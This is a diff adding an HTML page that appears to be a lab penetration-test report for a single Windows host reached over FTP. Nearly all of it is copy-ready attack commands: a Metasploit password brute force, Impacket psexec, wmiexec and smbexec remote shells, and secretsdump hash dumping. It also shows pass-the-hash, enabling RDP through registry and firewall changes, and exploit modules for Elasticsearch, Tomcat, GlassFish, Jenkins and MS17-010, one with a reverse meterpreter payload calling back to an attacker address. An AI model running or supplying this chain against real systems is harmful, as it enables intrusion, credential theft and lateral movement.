@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>FTP Access — Exploit, Credential, and Impacket Steps</title>
+  <style>
+    :root {
+      --bg: #0f1223;
+      --panel: #15193a;
+      --accent: #7c5cff;
+      --accent-2: #40c9ff;
+      --text: #e8ecff;
+      --muted: #a2a9d6;
+      --ok: #19c37d;
+      --warn: #ffd166;
+      --bad: #ef476f;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      --sans: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+      --radius: 14px;
+      --shadow: 0 10px 30px rgba(0,0,0,.35);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background: linear-gradient(180deg, #0b0e22 0%, #0f1223 100%);
+      color: var(--text);
+      font-family: var(--sans);
+      line-height: 1.55;
+    }
+    header {
+      padding: 16px 20px 0 20px;
+      display: grid;
+      gap: 16px;
+      max-width: 1080px;
+      margin: 0 auto;
+    }
+    .canvas-wrap {
+      background: #0b0e22;
+      border-radius: var(--radius);
+      overflow: hidden;
+      box-shadow: var(--shadow);
+    }
+    main {
+      max-width: 1080px;
+      margin: 20px auto 60px;
+      padding: 0 20px;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 18px;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+    }
+    .card {
+      background: var(--panel);
+      border: 1px solid rgba(124, 92, 255, 0.25);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 18px;
+    }
+    h1, h2, h3 { margin: 0 0 8px; }
+    h1 { font-size: 28px; letter-spacing: .2px; }
+    h2 { font-size: 20px; margin-top: 6px; color: var(--accent-2); }
+    h3 { font-size: 16px; color: var(--muted); }
+    .muted { color: var(--muted); }
+    .badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 10px;
+             background: rgba(64, 201, 255, .12); border: 1px solid rgba(64, 201, 255, .35);
+             color: var(--accent-2); border-radius: 999px; font-size: 12px; }
+    .kvs { display: grid; grid-template-columns: 140px 1fr; gap: 4px 10px; }
+    .kvs .k { color: var(--muted); }
+    pre { background: #0b0e22; border: 1px solid rgba(255,255,255,.08); padding: 12px 12px; 
+          border-radius: 12px; overflow:auto; box-shadow: inset 0 0 0 1px rgba(255,255,255,.03); }
+    code { font-family: var(--mono); font-size: 13px; }
+    .row { display: grid; grid-template-columns: 1fr; gap: 16px; }
+    .two { grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); }
+    .copy-btn { float: right; margin: -6px -6px 6px 6px; padding: 6px 10px; font-size: 12px;
+                background: rgba(124, 92, 255, .15); color: var(--text); border: 1px solid rgba(124, 92, 255, .35);
+                border-radius: 8px; cursor: pointer; }
+    details { margin-top: 8px; }
+    details > summary { cursor: pointer; padding: 8px 0; color: var(--accent-2); }
+    footer { max-width: 1080px; margin: 10px auto 40px; padding: 0 20px; color: var(--muted); font-size: 13px; }
+    .hl-ok { color: var(--ok); }
+    .hl-bad { color: var(--bad); }
+    .hl-note { color: var(--warn); }
+    .pill { display:inline-block; padding: 2px 8px; border-radius: 999px; background: rgba(25,195,125,.1);
+             border:1px solid rgba(25,195,125,.35); color: var(--ok); font-size:12px; }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="canvas-wrap">
+      <canvas id="banner" width="1080" height="220"></canvas>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <h1>FTP Access — Exploit, Credential, and Impacket Steps</h1>
+        <div class="muted">Generated: 2025-08-22 17:55:18</div>
+        <div style="margin-top:10px">
+          <span class="badge">Targeted Reporting</span>
+          <span class="badge">Lab / Pentest Use</span>
+          <span class="badge">HTML5 Canvas</span>
+        </div>
+      </div>
+      <div class="card">
+        <h2>Summary</h2>
+        <div class="kvs">
+          <div class="k">Target</div><div><code>192.168.56.106</code></div>
+          <div class="k">Service</div><div>FTP (21/tcp) — Microsoft ftpd</div>
+          <div class="k">Exploit Vector</div><div>Metasploit bruteforce <code>auxiliary/scanner/ftp/ftp_login</code></div>
+          <div class="k">Credential</div><div><code>administrator : vagrant</code> <span class="pill">valid</span></div>
+          <div class="k">Post-Ex</div><div>Impacket <code>psexec.py</code> used to obtain a remote shell</div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <section class="card">
+      <h2>1) Metasploit — FTP Bruteforce</h2>
+      <h3>Module & Options</h3>
+      <button class="copy-btn" data-copy="msf1">Copy</button>
+      <pre id="msf1"><code>use auxiliary/scanner/ftp/ftp_login
+set RHOSTS 192.168.56.106
+set RPORT 21
+set USER_FILE /usr/share/wordlists/metasploit/unix_users
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords
+set VERBOSE true
+set STOP_ON_SUCCESS true
+run</code></pre>
+
+      <h3>Result</h3>
+      <p>Successful login discovered:</p>
+      <pre><code>[+] 192.168.56.106:21 - Login Successful: administrator:vagrant</code></pre>
+
+      <details>
+        <summary>Verification tips (inside & outside Metasploit)</summary>
+        <button class="copy-btn" data-copy="msf2">Copy</button>
+        <pre id="msf2"><code># Inside MSF — confirm & log creds
+creds -t ftp
+set USERNAME administrator
+set PASSWORD vagrant
+unset USER_FILE
+unset PASS_FILE
+run
+
+# Outside MSF
+curl -v ftp://administrator:vagrant@192.168.56.106/
+ftp -inv 192.168.56.106
+user administrator vagrant</code></pre>
+      </details>
+    </section>
+
+    <section class="card">
+      <h2>2) Impacket — Remote Execution & Credential Dumping</h2>
+      <p>Using the valid credential, a remote shell was obtained with <code>psexec.py</code>. Alternative fileless/pipe methods listed as well.</p>
+
+      <div class="row two">
+        <div>
+          <h3>Check SMB access (Admin Shares)</h3>
+          <button class="copy-btn" data-copy="imp1">Copy</button>
+          <pre id="imp1"><code>python3 /usr/share/impacket/examples/smbclient.py administrator:vagrant@192.168.56.106 -command 'shares'
+python3 /usr/share/impacket/examples/smbclient.py administrator:vagrant@192.168.56.106 -command 'use ADMIN$; ls'
+python3 /usr/share/impacket/examples/smbclient.py administrator:vagrant@192.168.56.106 -command 'use C$; ls'</code></pre>
+        </div>
+        <div>
+          <h3>Get a Remote Shell</h3>
+          <button class="copy-btn" data-copy="imp2">Copy</button>
+          <pre id="imp2"><code># Service-based (often yields NT AUTHORITY\SYSTEM)
+python3 /usr/share/impacket/examples/psexec.py administrator:vagrant@192.168.56.106
+
+# Fileless WMI (quieter)
+python3 /usr/share/impacket/examples/wmiexec.py administrator:vagrant@192.168.56.106
+
+# Named pipe execution
+python3 /usr/share/impacket/examples/smbexec.py administrator:vagrant@192.168.56.106</code></pre>
+        </div>
+      </div>
+
+      <div class="row two">
+        <div>
+          <h3>Immediate Host Recon (in shell)</h3>
+          <button class="copy-btn" data-copy="imp3">Copy</button>
+          <pre id="imp3"><code>whoami /all
+hostname
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+net user
+net localgroup administrators
+ipconfig /all</code></pre>
+        </div>
+        <div>
+          <h3>Dump Local Hashes & Secrets</h3>
+          <button class="copy-btn" data-copy="imp4">Copy</button>
+          <pre id="imp4"><code>python3 /usr/share/impacket/examples/secretsdump.py administrator:vagrant@192.168.56.106
+
+# Pass-the-Hash (if needed)
+python3 /usr/share/impacket/examples/psexec.py administrator@192.168.56.106 -hashes :&lt;NTLM_HASH&gt;</code></pre>
+        </div>
+      </div>
+
+      <details>
+        <summary>Optional — Enable/Verify RDP</summary>
+        <button class="copy-btn" data-copy="imp5">Copy</button>
+        <pre id="imp5"><code>reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+python3 /usr/share/impacket/examples/rdp_check.py 192.168.56.106 -u administrator -p vagrant</code></pre>
+      </details>
+    </section>
+
+    <section class="card">
+      <h2>3) Evidence (to attach)</h2>
+      <ul>
+        <li>Metasploit success line(s) for FTP login.</li>
+        <li>First command outputs from the remote shell: <code>whoami</code>, <code>hostname</code>, <code>systeminfo</code>.</li>
+        <li>Any directory listings or config files retrieved (paths and timestamps).</li>
+        <li>Impacket <code>secretsdump.py</code> excerpt (sanitized as required).</li>
+      </ul>
+    </section>
+
+    <section class="card">
+      <h2>4) Additional Opportunities (based on same host)</h2>
+      <p class="muted">Leverage the valid credential (or dumped hashes) to expand access. Confirm scope/authorization before attempting.</p>
+      <div class="grid">
+        <div class="card">
+          <h3>Elasticsearch 1.1.1 (9200)</h3>
+          <p>Known RCE (CVE-2014-3120 / MVEL script). Try with Metasploit.</p>
+          <pre><code>use exploit/multi/elasticsearch/script_mvel_rce
+set RHOSTS 192.168.56.106
+set RPORT 9200
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST &lt;your-ip&gt;
+run</code></pre>
+        </div>
+        <div class="card">
+          <h3>GlassFish 4.0 (4848/8080)</h3>
+          <p>Check for default creds on admin console; deploy if valid.</p>
+          <pre><code>use auxiliary/scanner/http/glassfish_login
+set RHOSTS 192.168.56.106
+set RPORT 4848
+run
+# If creds → exploit/multi/http/glassfish_deployer</code></pre>
+        </div>
+        <div class="card">
+          <h3>Tomcat (AJP 8009 / HTTP 8282)</h3>
+          <p>Ghostcat (file read / potential code exec chain), plus Manager upload if creds.</p>
+          <pre><code>use auxiliary/admin/http/tomcat_ghostcat
+set RHOSTS 192.168.56.106
+set RPORT 8009
+run
+
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 192.168.56.106
+set RPORT 8282
+set TARGETURI /manager/html
+run</code></pre>
+        </div>
+        <div class="card">
+          <h3>Jenkins (8484)</h3>
+          <p>Enumerate; script console RCE if auth/CSRF allows.</p>
+          <pre><code>use auxiliary/scanner/http/jenkins_enum
+set RHOSTS 192.168.56.106
+set RPORT 8484
+run</code></pre>
+        </div>
+        <div class="card">
+          <h3>SMB / Windows</h3>
+          <p>MS17-010 check; reuse creds; lateral movement.</p>
+          <pre><code>use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.106
+run</code></pre>
+        </div>
+        <div class="card">
+          <h3>ManageEngine (8383)</h3>
+          <p>Service identified via certificate as Desktop Central/Endpoint Central; search MSF modules by version.</p>
+          <pre><code>search manageengine
+search endpoint_central
+search cve:2020-10189 cve:2021-44515 cve:2021-40539</code></pre>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <p>Note: This document is intended for authorized security testing in a controlled environment. Ensure activities remain within agreed scope.</p>
+  </footer>
+
+  <script>
+    // Copy buttons
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const id = btn.getAttribute('data-copy');
+        const el = document.getElementById(id);
+        if (!el) return;
+        navigator.clipboard.writeText(el.innerText.trim());
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy', 1400);
+      });
+    });
+
+    // Canvas banner
+    const c = document.getElementById('banner');
+    const ctx = c.getContext('2d');
+
+    // Gradient background
+    const g = ctx.createLinearGradient(0,0,c.width,0);
+    g.addColorStop(0, '#7c5cff');
+    g.addColorStop(.5, '#40c9ff');
+    g.addColorStop(1, '#19c37d');
+    ctx.fillStyle = g;
+    ctx.fillRect(0,0,c.width,c.height);
+
+    // Diagonal pattern overlay
+    ctx.globalAlpha = 0.12;
+    ctx.fillStyle = '#000';
+    for (let x=-200; x<c.width+200; x+=40) {
+      ctx.beginPath();
+      ctx.moveTo(x, -20);
+      ctx.lineTo(x+120, -20);
+      ctx.lineTo(x+20, c.height+40);
+      ctx.lineTo(x-100, c.height+40);
+      ctx.closePath();
+      ctx.fill();
+    }
+    ctx.globalAlpha = 1;
+
+    // Title text
+    ctx.fillStyle = '#fff';
+    ctx.font = '600 28px system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial';
+    ctx.fillText('FTP → RCE via Impacket psexec', 24, 64);
+
+    // Subtitle
+    ctx.font = '16px system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial';
+    ctx.fillText('Target 192.168.56.106  •  Creds administrator:vagrant  •  Generated 2025-08-22', 24, 92);
+
+    // Badges
+    function pill(x, y, text, fg, bg) {
+      ctx.font = '12px system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial';
+      const padX = 12, padY = 8;
+      const w = ctx.measureText(text).width + padX*2;
+      const h = 26;
+      const r = 12;
+      ctx.fillStyle = bg;
+      ctx.beginPath();
+      ctx.moveTo(x+r,y);
+      ctx.lineTo(x+w-r,y);
+      ctx.quadraticCurveTo(x+w,y,x+w,y+r);
+      ctx.lineTo(x+w,y+h-r);
+      ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
+      ctx.lineTo(x+r,y+h);
+      ctx.quadraticCurveTo(x,y+h,x,y+h-r);
+      ctx.lineTo(x,y+r);
+      ctx.quadraticCurveTo(x,y,x+r,y);
+      ctx.fill();
+      ctx.fillStyle = fg;
+      ctx.fillText(text, x+padX, y+17);
+    }
+    pill(24, 120, 'Metasploit ftp_login', '#e8ecff', 'rgba(12,12,18,.35)');
+    pill(190, 120, 'Credential ✓', '#19c37d', 'rgba(25,195,125,.18)');
+    pill(310, 120, 'Impacket psexec', '#e8ecff', 'rgba(64,201,255,.22)');
+  </script>
+</body>
+</html>
